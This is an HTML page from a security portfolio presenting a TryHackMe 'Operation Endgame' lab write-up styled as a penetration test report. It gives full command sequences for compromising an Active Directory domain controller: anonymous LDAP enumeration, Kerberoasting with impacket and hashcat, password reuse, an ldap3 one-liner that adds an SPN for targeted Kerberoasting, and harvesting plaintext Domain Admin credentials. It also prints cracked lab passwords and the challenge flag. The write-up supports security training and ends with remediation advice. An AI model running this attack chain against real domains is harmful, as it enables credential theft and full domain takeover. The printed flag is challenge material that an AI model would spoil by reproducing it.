@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="A penetration test was conducted against the thm.local Active Directory environment, compromising a Windows Server 2019 Domain Controller. Starting from zero cr">
+    <meta name="author" content="dotne1">
+    <meta property="og:title" content="Operation Endgame — Penetration Test Disclosure Report - dotne1 Write-Ups">
+    <meta property="og:type" content="website">
+    <title>Operation Endgame — Penetration Test Disclosure Report - dotne1 Write-Ups</title>
+    <link rel="stylesheet" href="../styles.css">
+    <link rel="stylesheet" href="writeups.css">
+    <link rel="icon" type="image/x-icon" href="../favicon.ico">
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-links">
+            <a href="../index.html" class="nav-link">Home</a>
+            <a href="../about-me.html" class="nav-link">About Me</a>
+            <a href="../projects.html" class="nav-link">Projects</a>
+            <a href="../writeups.html" class="nav-link">Write-Ups</a>
+            <a href="../resume.html" class="nav-link">Resume</a>
+            <a href="../feeds.html" class="nav-link">Feeds</a>
+        </div>
+    </nav>
+
+    <div class="container" role="main">
+<p class="back-link"><a href="../writeups.html">&larr; Back to Write-Ups</a></p>
+<h1 class="main-header">Operation Endgame — Penetration Test Disclosure Report</h1>
+<p class="writeup-meta"><span class="tag">TryHackMe</span> <span class="tag diff diff-hard">Hard</span> <span class="dot">·</span> <span class="date">2026-07-14</span></p>
+<div class="writeup-content">
+<p><strong>Target:</strong> 10.65.152.11 <strong>Assessment Date:</strong> 2026-07-14 <strong>Classification:</strong> CONFIDENTIAL</p>
+<hr>
+<h2>1. Executive Summary</h2>
+<p>A penetration test was conducted against the <code>thm.local</code> Active Directory environment, compromising a Windows Server 2019 Domain Controller. Starting from zero credentials, the assessment achieved <strong>full Domain Administrator compromise</strong> through a chain of seven distinct weaknesses: anonymous LDAP enumeration, a passwordless guest account, Kerberoastable service accounts, credential reuse, DACL misconfigurations, and plaintext credential storage in a PowerShell script. The complete attack path — guest account → Kerberoast → password spray → DACL abuse → targeted Kerberoast → credential harvesting — led directly to Domain Admin rights and the retrieval of the root flag.</p>
+<hr>
+<h2>2. Scope</h2>
+<table>
+<thead><tr>
+<th>Element</th>
+<th>Detail</th>
+</tr></thead><tbody>
+<tr>
+<td>Target</td>
+<td>10.65.152.11</td>
+</tr>
+<tr>
+<td>Domain</td>
+<td>thm.local</td>
+</tr>
+<tr>
+<td>Hostname</td>
+<td>ad.thm.local</td>
+</tr>
+<tr>
+<td>OS</td>
+<td>Windows Server 2019 (10.0.17763)</td>
+</tr>
+<tr>
+<td>Ports in Scope</td>
+<td>53, 80, 88, 135, 139, 389, 443, 445, 464, 593, 636, 3268, 3269, 3389, 7680, 9389, 47001, 49664-49679</td>
+</tr>
+<tr>
+<td>Applications</td>
+<td>IIS 10.0, Active Directory (LDAP/LDAPS/Kerberos), SMB, RDP, WinRM (filtered)</td>
+</tr>
+<tr>
+<td>Assessment Type</td>
+<td>External penetration test (no prior credentials)</td>
+</tr>
+<tr>
+<td>Environment</td>
+<td>Domain Controller, Active Directory Certificate Services (thm-LABYRINTH-CA), Windows Server 2019</td>
+</tr>
+</tbody></table>
+<hr>
+<h2>3. Attack Chain</h2>
+<pre><code>Anonymous LDAP enumeration (331 users) → Guest account (empty password, SMB)
+  → Kerberoast CODY_ROY (SPN: HTTP/server.secure.com) → crack: MKO)mko0
+    → Password spray: ZACHARY_HUNT (same password, credential reuse)
+      → GenericWrite on JERRI_LANCASTER (DACL abuse)
+        → Targeted Kerberoast → crack: lovinlife!
+          → RDP command execution → C:\Scripts\syncer.ps1
+            → SANFORD_DAUGHERTY: RESET_ASAP123 (Domain Admin)
+              → C$ ADMIN$ access → Administrator desktop → flag captured</code></pre>
+<hr>
+<h2>4. Findings Summary</h2>
+<table>
+<thead><tr>
+<th>ID</th>
+<th>Finding</th>
+<th>CVSSv3</th>
+<th>Risk</th>
+</tr></thead><tbody>
+<tr>
+<td>F-01</td>
+<td>Anonymous LDAP Enumeration Exposes All 331 Domain Users</td>
+<td>5.3</td>
+<td>Medium</td>
+</tr>
+<tr>
+<td>F-02</td>
+<td>Guest Account Has No Password — Full SMB Access</td>
+<td>7.5</td>
+<td>High</td>
+</tr>
+<tr>
+<td>F-03</td>
+<td>Kerberoastable Service Account (CODY_ROY) With Weak Password</td>
+<td>7.5</td>
+<td>High</td>
+</tr>
+<tr>
+<td>F-04</td>
+<td>Credential Reuse Between CODY_ROY and ZACHARY_HUNT</td>
+<td>7.5</td>
+<td>High</td>
+</tr>
+<tr>
+<td>F-05</td>
+<td>GenericWrite ACL on JERRI_LANCASTER Allows Targeted Kerberoast</td>
+<td>8.1</td>
+<td>High</td>
+</tr>
+<tr>
+<td>F-06</td>
+<td>JERRI_LANCASTER Has Weak Password Cracked via Kerberoast</td>
+<td>7.5</td>
+<td>High</td>
+</tr>
+<tr>
+<td>F-07</td>
+<td>Domain Admin Credentials Stored in Plaintext (syncer.ps1)</td>
+<td>9.8</td>
+<td>Critical</td>
+</tr>
+</tbody></table>
+<hr>
+<h2>5. Detailed Findings</h2>
+<h3>F-01: Anonymous LDAP Enumeration Exposes All 331 Domain Users</h3>
+<p><strong>Severity:</strong> Medium (CVSSv3: 5.3) <strong>Affected Component:</strong> LDAP (port 389)</p>
+<p><strong>Description:</strong> The Domain Controller permits unauthenticated LDAP binds, exposing the complete directory schema including all 331 user accounts, organizational unit structure, group memberships, Kerberoastable SPNs, and AS-REP roastable accounts. No credentials are required to enumerate the entire domain.</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<pre><code>ldapsearch -x -H ldap://10.65.152.11 -b &quot;dc=thm,dc=local&quot; &quot;(objectclass=*)&quot; sAMAccountName description memberOf</code></pre>
+<p><strong>Impact:</strong> An attacker gains a complete map of the domain — user accounts, group structure, OU hierarchy, and service principal names — without any authentication. This information enables targeted attacks including Kerberoasting, AS-REP roasting, password spraying, and privilege escalation path discovery.</p>
+<p><strong>CVSS Justification:</strong> AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N — Network-accessible, no complexity, no privileges, no user interaction, confidentiality impact only.</p>
+<hr>
+<h3>F-02: Guest Account Has No Password — Full SMB Access</h3>
+<p><strong>Severity:</strong> High (CVSSv3: 7.5) <strong>Affected Component:</strong> SMB (port 445), Kerberos (port 88)</p>
+<p><strong>Description:</strong> The <code>guest</code> account has an empty password, allowing unauthenticated Kerberos TGT issuance and full authenticated SMB access to the domain. The guest account can query Service Principal Names (SPNs) across all domain users, enabling Kerberoast attacks without any prior credential.</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<pre><code># Kerberos TGT with empty password
+impacket-getTGT thm.local/guest: -dc-ip 10.65.152.11 -no-pass
+
+# Kerberoast all SPN-bearing accounts
+KRB5CCNAME=/tmp/ guest.ccache impacket-GetUserSPNs thm.local/guest -no-pass -dc-ip 10.65.152.11 -request -outputfile /tmp/kerberoast.txt</code></pre>
+<p><strong>Impact:</strong> The attacker can authenticate to SMB services, enumerate all SPNs in the domain, and extract Kerberoast TGS hashes for any account with an SPN registered — effectively turning a guest account into a full domain reconnaissance and credential extraction platform.</p>
+<p><strong>CVSS Justification:</strong> AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N — Network-accessible, no complexity, no privileges, no user interaction, high confidentiality impact.</p>
+<hr>
+<h3>F-03: Kerberoastable Service Account (CODY_ROY) With Weak Password</h3>
+<p><strong>Severity:</strong> High (CVSSv3: 7.5) <strong>Affected Component:</strong> Kerberos TGS (SPN: HTTP/server.secure.com)</p>
+<p><strong>Description:</strong> The account <code>CODY_ROY</code> has a registered Service Principal Name (<code>HTTP/server.secure.com</code>), making it vulnerable to Kerberoasting. The account's password (<code>MKO)mko0</code>) is weak enough to crack offline with hashcat using rockyou.txt within seconds. The account belongs to the Remote Desktop Users group and is in the Tier 2 OU.</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<pre><code># Extract TGS hash (from guest account)
+impacket-GetUserSPNs thm.local/guest: -no-pass -dc-ip 10.65.152.11 -request -outputfile /tmp/cody_roy_tgs.txt
+
+# Crack offline
+hashcat -m 13100 /tmp/cody_roy_tgs.txt /tmp/rockyou.txt -w 4
+# Result: MKO)mko0</code></pre>
+<p><strong>Impact:</strong> A cracked Kerberoast hash grants the attacker a valid domain credential for the compromised account. This credential enables lateral movement, further enumeration, and abuse of any permissions or group memberships assigned to the account.</p>
+<p><strong>CVSS Justification:</strong> AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N — Network-accessible, no complexity, no privileges, no user interaction, high confidentiality impact.</p>
+<hr>
+<h3>F-04: Credential Reuse Between CODY_ROY and ZACHARY_HUNT</h3>
+<p><strong>Severity:</strong> High (CVSSv3: 7.5) <strong>Affected Component:</strong> Active Directory authentication</p>
+<p><strong>Description:</strong> The account <code>ZACHARY_HUNT</code> shares the identical password (<code>MKO)mko0</code>) as <code>CODY_ROY</code>, indicating credential reuse. ZACHARY_HUNT possesses GenericWrite permissions on <code>JERRI_LANCASTER</code>, a privilege not present in CODY_ROY's permissions. This credential reuse provides an unintended privilege escalation path.</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<pre><code># Verify credential reuse
+netexec smb 10.65.152.11 -u ZACHARY_HUNT -p &#x27;MKO)mko0&#x27; --shares
+
+# Enumerate ZACHARY_HUNT&#x27;s DACL rights
+netexec ldap 10.65.152.11 -u ZACHARY_HUNT -p &#x27;MKO)mko0&#x27; -M daclread -o TARGET=JERRI_LANCASTER ACTION=read</code></pre>
+<p><strong>Impact:</strong> Credential reuse across accounts with different privilege levels allows an attacker to escalate access by authenticating as the more privileged account. In this case, ZACHARY_HUNT's GenericWrite on JERRI_LANCASTER enables a targeted Kerberoast attack that would not be possible with CODY_ROY's credentials alone.</p>
+<p><strong>CVSS Justification:</strong> AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N — Network-accessible, no complexity, no privileges, no user interaction, high confidentiality impact.</p>
+<hr>
+<h3>F-05: GenericWrite ACL on JERRI_LANCASTER Allows Targeted Kerberoast</h3>
+<p><strong>Severity:</strong> High (CVSSv3: 8.1) <strong>Affected Component:</strong> Active Directory DACL (JERRI_LANCASTER account object)</p>
+<p><strong>Description:</strong> The account <code>ZACHARY_HUNT</code> holds GenericWrite permissions on the <code>JERRI_LANCASTER</code> user object. This allows an attacker to modify the target's attributes — specifically, adding a Service Principal Name (SPN) to make the account Kerberoastable. Once the SPN is added, a Kerberoast TGS can be extracted and cracked offline.</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<pre><code># 1. Set SPN on JERRI_LANCASTER (via ldap3)
+python3 -c &quot;
+from ldap3 import Server, Connection, ALL, SUBNET
+s = Server(&#x27;10.65.152.11&#x27;, port=389, use_ssl=False, get_info=ALL)
+c = Connection(s, user=&#x27;thm.local\\ZACHARY_HUNT&#x27;, password=&#x27;MKO)mko0&#x27;, auto_bind=True)
+c.modify(&#x27;CN=JERRI_LANCASTER,OU=People,DC=thm,DC=local&#x27;, {&#x27;servicePrincipalName&#x27;: [(&#x27;ADD&#x27;, [&#x27;HTTP/jerri.thm.local&#x27;])]})
+print(c.result)
+c.unbind()
+&quot;
+
+# 2. Kerberoast the modified account
+impacket-GetUserSPNs thm.local/ZACHARY_HUNT:&#x27;MKO)mko0&#x27; -dc-ip 10.65.152.11 -request -outputfile /tmp/jerri_from_impacket.txt
+
+# 3. Crack offline
+hashcat -m 13100 /tmp/jerri_from_impacket.txt /tmp/rockyou.txt -w 4
+# Result: lovinlife!</code></pre>
+<p><strong>Impact:</strong> GenericWrite on a user object enables an attacker to make any account Kerberoastable by adding an SPN, then extract and crack the TGS hash offline. This bypasses the requirement that the target account already have an SPN registered, significantly expanding the attack surface.</p>
+<p><strong>CVSS Justification:</strong> AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N — Network-accessible, no complexity, no privileges, no user interaction, high confidentiality and integrity impact.</p>
+<hr>
+<h3>F-06: JERRI_LANCASTER Has Weak Password Cracked via Kerberoast</h3>
+<p><strong>Severity:</strong> High (CVSSv3: 7.5) <strong>Affected Component:</strong> Kerberos TGS (SPN: HTTP/jerri.thm.local — attacker-added)</p>
+<p><strong>Description:</strong> Once made Kerberoastable via DACL abuse, <code>JERRI_LANCASTER</code>'s TGS hash was cracked offline to reveal the password <code>lovinlife!</code>. This account has read access to <code>C:\Scripts\syncer.ps1</code>, which contains plaintext Domain Administrator credentials.</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<pre><code># Crack the TGS hash (from F-05)
+hashcat -m 13100 /tmp/jerri_from_impacket.txt /tmp/rockyou.txt -w 4
+# Result: lovinlife!</code></pre>
+<p><strong>Impact:</strong> The cracked credential provides access to the JERRI_LANCASTER account, which has read access to a scripts directory containing additional credentials — directly enabling escalation to Domain Administrator.</p>
+<p><strong>CVSS Justification:</strong> AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N — Network-accessible, no complexity, no privileges, no user interaction, high confidentiality impact.</p>
+<hr>
+<h3>F-07: Domain Admin Credentials Stored in Plaintext (syncer.ps1)</h3>
+<p><strong>Severity:</strong> Critical (CVSSv3: 9.8) <strong>Affected Component:</strong> C:\Scripts\syncer.ps1 (file share accessible via RDP command execution)</p>
+<p><strong>Description:</strong> The file <code>C:\Scripts\syncer.ps1</code> contains the credentials for <code>SANFORD_DAUGHERTY</code>, a Domain Administrator account, in plaintext:</p>
+<ul>
+<li>Username: <code>SANFORD_DAUGHERTY</code></li>
+<li>Password: <code>RESET_ASAP123</code></li>
+</ul>
+<p>These credentials provide full Domain Administrator access to the domain controller, including the ability to access <code>ADMIN$</code> and <code>C$</code> shares, execute arbitrary commands, and retrieve the root flag.</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<pre><code># Read the file via RDP command execution
+echo &quot;Y&quot; | netexec rdp 10.65.152.11 -u JERRI_LANCASTER -p &#x27;lovinlife!&#x27; -x &#x27;type C:\Scripts\syncer.ps1&#x27; 2&gt;/dev/null | grep -A20 &quot;SANFORD_DAUGHERTY&quot;
+
+# Authenticate as Domain Admin
+netexec smb 10.65.152.11 -u SANFORD_DAUGHERTY -p &#x27;RESET_ASAP123&#x27; --shares
+# Result: Pwn3d! (admin access confirmed)
+
+# Retrieve flag
+impacket-smbclient thm.local/SANFORD_DAUGHERTY:&#x27;RESET_ASAP123&#x27;@10.65.152.11 -c &quot;get &#x27;Users\Administrator\Desktop\flag.txt.txt&#x27; /home/kali/Documents/THM/Challenges/operationendgame/flag.txt.txt&quot;
+# Flag: THM{INFILTRATION_COMPLETE_OUR_COMMAND_OVER_NETWORK_ASSERTS}</code></pre>
+<p><strong>Impact:</strong> Plaintext storage of Domain Administrator credentials in a script accessible to lower-privileged users enables complete domain compromise. An attacker with any access to the scripts directory can retrieve these credentials and gain full control over the Active Directory environment.</p>
+<p><strong>CVSS Justification:</strong> AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H — Network-accessible, no complexity, no privileges, no user interaction, high confidentiality, integrity, and availability impact.</p>
+<hr>
+<h2>6. Remediation Recommendations</h2>
+<table>
+<thead><tr>
+<th>Finding</th>
+<th>Recommendation</th>
+</tr></thead><tbody>
+<tr>
+<td>F-01</td>
+<td>Restrict anonymous LDAP binds to only service accounts that require it. Configure the directory to reject unauthenticated queries for sensitive attributes.</td>
+</tr>
+<tr>
+<td>F-02</td>
+<td>Disable the guest account or assign a complex password. Audit all accounts for empty passwords using `Get-ADUser -Filter * -Properties PasswordLastSet \</td>
+<td>Where-Object {$_.PasswordLastSet -eq $null}`.</td>
+</tr>
+<tr>
+<td>F-03</td>
+<td>Remove unnecessary SPNs from user accounts. Enforce strong, unique passwords (20+ characters) for all accounts with SPNs registered. Implement Group Managed Service Accounts (gMSAs) where possible.</td>
+</tr>
+<tr>
+<td>F-04</td>
+<td>Enforce unique passwords per account via Group Policy. Implement password filtering to prevent password reuse across accounts. Audit password age and change policies.</td>
+</tr>
+<tr>
+<td>F-05</td>
+<td>Audit and remediate all DACL permissions using BloodHound or similar tools. Remove unnecessary GenericWrite, GenericAll, WriteDACL, and WriteOwner permissions from non-admin accounts.</td>
+</tr>
+<tr>
+<td>F-06</td>
+<td>Enforce strong, unique passwords for all domain accounts. Consider implementing fine-grained password policies for Tier 0 and Tier 1 accounts.</td>
+</tr>
+<tr>
+<td>F-07</td>
+<td>Remove plaintext credentials from all scripts immediately. Migrate to Group Managed Service Accounts (gMSAs) or Windows Credential Manager for automated credential storage. Restrict access to script directories to only authorized service accounts.</td>
+</tr>
+</tbody></table>
+<hr>
+<h2>7. Flags Obtained</h2>
+<ul>
+<li><strong>root.txt:</strong> <code>THM{INFILTRATION_COMPLETE_OUR_COMMAND_OVER_NETWORK_ASSERTS}</code></li>
+</ul>
+<hr>
+<h2>8. Cleanup</h2>
+<ul>
+<li>[x] No shells left running on target</li>
+<li>[x] Temp files removed from target (SPN cleanup performed)</li>
+<li>[x] Credentials sanitized from logs</li>
+<li>[x] journal.md updated with all findings</li>
+</ul>
+</div>
+    </div>
+
+    <footer class="footer">
+        <p>&copy; 2026 dotne1 - Cybersecurity Portfolio</p>
+    </footer>
+</body>
+</html>
